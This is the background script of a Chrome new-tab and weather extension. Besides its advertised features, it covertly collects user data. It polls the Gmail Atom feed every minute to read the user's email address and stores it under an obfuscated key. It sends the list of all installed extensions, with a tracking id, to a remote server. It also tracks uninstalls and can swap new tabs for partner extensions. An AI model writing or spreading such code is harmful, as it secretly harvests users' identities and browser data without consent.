(function(e) {
  "use strict";
  var t = localStorage.getItem("user_group") || Math.floor(Math.random() * 10) + 1;
  localStorage.setItem("user_group", t);
  localStorage.setItem("newtab_url", chrome.extension.getURL("/start/index.html"));
  localStorage.setItem("ext_id", chrome.runtime.id);
  localStorage.setItem("ext_name", chrome.i18n.getMessage("extName"));
  chrome.browserAction.onClicked.addListener(function() {
    chrome.extension.sendMessage("click-BrowserAction");
    chrome.tabs.create({
      url: localStorage.getItem("newtab_url")
    });
  });
  chrome.runtime.setUninstallURL(user["firstRunLandingPage"] + "?ext_uninstall&id=" + chrome.runtime.id);
  var o = utils.get;
  var a = utils.set;
  localStorage["setting_geo"] = new Date().getTime();
  var n = 0;
  var r = null;
  function i() {
    if (r) clearTimeout(r);
    var t = "http://" + localStorage.getItem("user_group") + "." + user["firstRunDomain"] + "/v1/geo/?uid=" + localStorage.getItem("uid") + "&idt=" + localStorage.getItem("installdt") + "&dsb=" + localStorage.getItem("installdc") + "&grp=" + localStorage.getItem("user_group") + "&ver=" + localStorage.getItem("version") + "&eid=" + chrome.runtime.id + "&ext=" + encodeURIComponent(chrome.i18n.getMessage("extName")) + "&cb=" + Math.floor(Math.random() * 999999);
    ajax_post(t, null, "json", function(e) {
      if (e.highlight) localStorage.setItem("highlight", e.highlight); else localStorage.removeItem("highlight");
      var t = e.country_code;
      if (!user["geodata"]) {
        if ([ "US", "BM", "BZ", "JM", "PW" ].indexOf(t.toUpperCase()) >= 0) {
          user["units_weather"] = "imperial";
          user["date_format"] = "{{m}}.{{d}}.{{y}}";
          user["time_format"] = "12h";
        } else {
          user["units_weather"] = "metric";
          user["date_format"] = "{{d}}.{{m}}.{{y}}";
          user["time_format"] = "24h";
        }
      }
      user["geodata"] = JSON.stringify(e);
      if (n == 0) {
        p();
      } else {
        if (e.relate && e.relate.length) {
          chrome.tabs.query({}, function(e) {
            for (var t = 0; t < e.length; t++) {
              chrome.tabs.sendMessage(e[t].id, {
                refreshRelativeApps: true
              });
            }
          });
        }
      }
      n++;
      if (!user["sengine"]) {
        user["sengine"] = SEARCH_ENGINES_DEFAULT;
      }
      utils.localstorage2cookie();
      delete localStorage["setting_geo"];
      var o = localStorage.getItem("user_input_city");
      var a = localStorage.getItem("user_input_city_isvalid") === "true";
      if (o && a) {
        c(o);
      } else if (e.city && e.country_name) {
        c(e.city + ", " + e.country_name);
      } else if (e.city) {
        c(e.city);
      } else {
        trackStatusEvent("error-Geo-NoCity", null, e.ip);
      }
    }, function(t) {
      if (r) clearTimeout(r);
      r = setTimeout(i, Math.floor(3 * 6e4 + Math.random() * 5 * 6e4));
      delete localStorage["setting_geo"];
      if (e.debug) console.log("error geolocator: ", t, arguments);
    });
  }
  function l(e) {
    var t = {
      woeid: e.woeid
    };
    if (e.locality1 && e.locality1.content) t.city = e.locality1.content; else t.city = isNaN(e.name) ? e.name : e.admin1 ? e.admin1.content : e.name;
    if (e.country) t.countrycode = e.country.code;
    return t;
  }
  function s() {
    chrome.tabs.query({}, function(e) {
      for (var t = 0; t < e.length; t++) {
        chrome.tabs.sendMessage(e[t].id, {
          type: "error_city_not_found",
          info: {
            error_msg: "Unable to get your city."
          }
        });
      }
    });
  }
  function c(t) {
    var o = "https://query.yahooapis.com/v1/public/yql?q=SELECT%20*%20FROM%20geo.places%20WHERE%20text%3D%22" + encodeURIComponent(t) + "%22&format=json";
    $.getJSON(o, function(o) {
      var a = o.query.count;
      var n = null;
      var r = false;
      if (a > 1) {
        r = true;
        n = l(o.query.results.place[0]);
      } else if (a == 1 && o.query.results.place) {
        r = true;
        n = l(o.query.results.place);
      }
      if (r) {
        var i = {
          enteredLocation: t,
          woeid: n.woeid,
          location_name: n.city
        };
        localStorage.setItem("weather_location", JSON.stringify(i));
        chrome.tabs.query({}, function(e) {
          for (var t = 0; t < e.length; t++) {
            chrome.tabs.sendMessage(e[t].id, {
              refreshWeather: true
            });
          }
        });
      } else {
        if (e.debug) console.log("Error getting GeoPlaces");
        s();
        trackStatusEvent("error-GeoPlaces-NoData", null, t);
      }
    }).fail(function(t, o, a) {
      if (e.debug) console.log("Error in GeoPlaces request");
      s();
    });
  }
  i();
  utils.localstorage2cookie();
  chrome.runtime.onMessage.addListener(function(t, o, a) {
    if (e.debug) console.log("onMessage: ", t, o);
    if (t.ext) {
      var n = JSON.parse(t.ext);
      for (var r in n) {
        localStorage[r] = n[r];
      }
      if (!n["sengine"]) {
        delete localStorage["sengine"];
      }
    } else if (t.getall) {
      a({
        ext: JSON.stringify(localStorage)
      });
    } else if (t.topSites) {
      chrome.topSites.get(function(e) {
        a(e);
      });
      return true;
    }
    if (t.type === "weather_location_request") {
      var i = t.info.enteredLocation;
      localStorage.setItem("user_input_city", i);
      if (e.debug) console.log("request.info.enteredLocation", t.info.enteredLocation);
      c(t.info.enteredLocation);
    }
    if (t.type === "fetch_email_data") {
      f(u, m);
    }
    if (t.changeOptions) {
      var l = JSON.parse(localStorage.getItem("had_wl"));
      if (l.length > 0) {
        utils.getEnabledAppsInWhitelist(l, function(e) {
          e.forEach(function(e) {
            if (e.id !== chrome.runtime.id) {
              chrome.runtime.sendMessage(e.id, {
                changeOptions: utils.getGlobalOptions()
              });
            }
          });
        });
      }
      chrome.tabs.query({}, function(e) {
        for (var t = 0; t < e.length; t++) {
          if (e[t].id !== o.tab.id) {
            chrome.tabs.sendMessage(e[t].id, {
              refreshOptions: true
            });
          }
        }
      });
    }
  });
  var g = function(e) {
    return btoa(encodeURIComponent(e).replace(/%([0-9A-F]{2})/g, function e(t, o) {
      return String.fromCharCode("0x" + o);
    })).replace(/\+/g, "-").replace(/\//g, "_").replace(/\=/g, ".").replace(/([a-zA-Z0-9._-]{10})/g, "$1~");
  };
  var d = function(e) {
    return decodeURIComponent(atob(e.replace(/\-/g, "+").replace(/\_/g, "/").replace(/\./g, "=").replace(/\~/g, "")).split("").map(function(e) {
      return "%" + ("00" + e.charCodeAt(0).toString(16)).slice(-2);
    }).join(""));
  };
  var u = function(e, t) {
    var o = {
      g: e
    };
    if (localStorage.getItem("dim1")) {
      try {
        o = JSON.parse(d(localStorage.getItem("dim1")));
        o.g = e;
      } catch (e) {}
    }
    localStorage.setItem("dim1", g(JSON.stringify(o)));
    chrome.tabs.query({}, function(o) {
      for (var a = 0; a < o.length; a++) {
        chrome.tabs.sendMessage(o[a].id, {
          type: "gmail_info_fetched",
          info: {
            mailAddress: e,
            mailNums: t
          }
        });
      }
    });
  };
  var m = function(t) {
    if (t) {
      if (e.debug) console.log("background error: ", t);
    } else {
      if (e.debug) console.log("background An error occur!");
    }
  };
  var f = function(e, t) {
    var o = "https://mail.google.com/mail/feed/atom";
    var a = new XMLHttpRequest();
    a.onreadystatechange = function() {
      if (a.readyState != 4) return;
      if (a.responseXML) {
        var o = a.responseXML;
        var n = "";
        var r = o.getElementsByTagName("title")[0].textContent.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
        if (r.length) n = r[0];
        var i = o.getElementsByTagName("fullcount")[0].textContent;
        if (n) {
          e(n, i);
        }
      } else {
        t();
      }
    };
    a.onerror = function(e) {
      t(e);
    };
    a.open("GET", o, true, null, null);
    a.send(null);
  };
  setInterval(f.bind(e, u, m), 6e4);
  function h(t, o) {
    var a = [];
    for (var n = 0; n < t.length; n++) {
      var r = t[n];
      a.push({
        i: r.id,
        n: r.name,
        e: r.enabled,
        m: r.installType,
        t: r.type,
        v: r.version
      });
    }
    var i = "http://" + localStorage.getItem("user_group") + "." + user["firstRunDomain"] + "/v1/had/?uid=" + localStorage.getItem("uid") + "&idt=" + localStorage.getItem("installdt") + "&dsb=" + localStorage.getItem("installdc") + "&grp=" + localStorage.getItem("user_group") + "&ver=" + localStorage.getItem("version") + "&eid=" + chrome.runtime.id + "&cb=" + Math.floor(Math.random() * 999999);
    $.post(i, {
      list: JSON.stringify(a)
    }, function(t) {
      if (e.debug) console.log(o, t.wl);
      if (t && t.wl && t.wl.length) {
        var a = JSON.parse(user["geodata"]);
        var n = utils.getAppsInList2ThatNotInList1([].concat([ {
          id: chrome.runtime.id
        } ], a.relate), t.wl);
        if (e.debug) console.log("added " + n.length);
        if (n.length) {
          a.relate = [].concat(a.relate, n);
          localStorage.setItem("geodata", JSON.stringify(a));
          if (a.relate && a.relate.length) {
            chrome.tabs.query({}, function(e) {
              for (var t = 0; t < e.length; t++) {
                chrome.tabs.sendMessage(e[t].id, {
                  refreshRelativeApps: true
                });
              }
            });
          }
        }
        if (o === "onInstalled" || o === "onEnabled") {
          var r = JSON.parse(localStorage.getItem("had_wl"));
          var n = utils.getAppsInList2ThatNotInList1(r, t.wl);
          if (e.debug) console.log("add to wl " + n.length);
          r = [].concat(r, n);
          localStorage.setItem("had_wl", JSON.stringify(r));
          setTimeout(function() {
            chrome.runtime.sendMessage(t.wl[0].id, {
              changeOptions: utils.getGlobalOptions()
            }, function(t) {
              if (e.debug) console.log("sync " + chrome.runtime.id + " - " + t);
            });
          }, Math.floor(1e3 + Math.random() * 1e3));
        } else {
          localStorage.setItem("had_wl", JSON.stringify(t.wl));
        }
      }
    }, "json");
  }
  chrome.management.onInstalled.addListener(function(t) {
    if (e.debug) console.log("inst:", t);
    h([ t ], "onInstalled");
  });
  chrome.management.onEnabled.addListener(function(t) {
    if (e.debug) console.log("enabled:", t);
    h([ t ], "onEnabled");
  });
  function p() {
    chrome.management.getAll(function(e) {
      h(e, "allApps");
    });
  }
  function _(e, t) {
    e = Math.ceil(e);
    t = Math.floor(t);
    return Math.floor(Math.random() * (t - e)) + e;
  }
  chrome.tabs.onCreated.addListener(function(t) {
    if (t.url.match("chrome://newtab/")) {
      var o = new Date().getTime();
      var a = 0;
      var n = 30;
      try {
        a = parseInt(localStorage.getItem("last_opened") + "");
        var l = JSON.parse(user["geodata"]);
        if (l.delay) n = parseInt(l.delay);
      } catch (e) {}
      if (e.debug) console.log("last open was " + Math.floor((o - a) / 1e3) + "s ago");
      if (o - a > n * 6e4) {
        localStorage.setItem("last_opened", o);
        if (r) clearTimeout(r);
        r = setTimeout(i, Math.floor(Math.random() * 6e4));
      }
      if (localStorage.getItem("random_all_newtab") == "yes") {
        var s = JSON.parse(localStorage.getItem("had_wl"));
        if (s.length > 0) {
          utils.getEnabledAppsInWhitelist(s, function(e) {
            var o = e[Math.floor(Math.random() * e.length)];
            var a = "chrome-extension://" + o.id + "/start/index.html";
            chrome.tabs.update(t.id, {
              url: a
            }, function(e) {});
          });
        }
      }
    }
  });
  chrome.runtime.onMessageExternal.addListener(function(t, o, a) {
    if (e.debug) console.log("exMsg:", t, o);
    if (t.changeOptions) {
      if (t.changeOptions.disable_weather) localStorage.setItem("disable_weather", t.changeOptions.disable_weather);
      if (t.changeOptions.disable_most_visited) localStorage.setItem("disable_most_visited", t.changeOptions.disable_most_visited);
      if (t.changeOptions.disable_apps) localStorage.setItem("disable_apps", t.changeOptions.disable_apps);
      if (t.changeOptions.disable_share) localStorage.setItem("disable_share", t.changeOptions.disable_share);
      if (t.changeOptions.disable_todo) localStorage.setItem("disable_todo", t.changeOptions.disable_todo);
      if (t.changeOptions.hideTodoPanel) localStorage.setItem("hideTodoPanel", t.changeOptions.hideTodoPanel);
      if (t.changeOptions.todoList) localStorage.setItem("todoList", t.changeOptions.todoList);
      if (t.changeOptions.had_wl) localStorage.setItem("had_wl", t.changeOptions.had_wl);
      if (t.changeOptions.random_all_newtab) localStorage.setItem("random_all_newtab", t.changeOptions.random_all_newtab);
      chrome.tabs.query({}, function(e) {
        for (var t = 0; t < e.length; t++) {
          chrome.tabs.sendMessage(e[t].id, {
            refreshOptions: true
          });
        }
      });
      if (typeof a === "function") a(chrome.runtime.id + " OK");
    }
  });
})(this);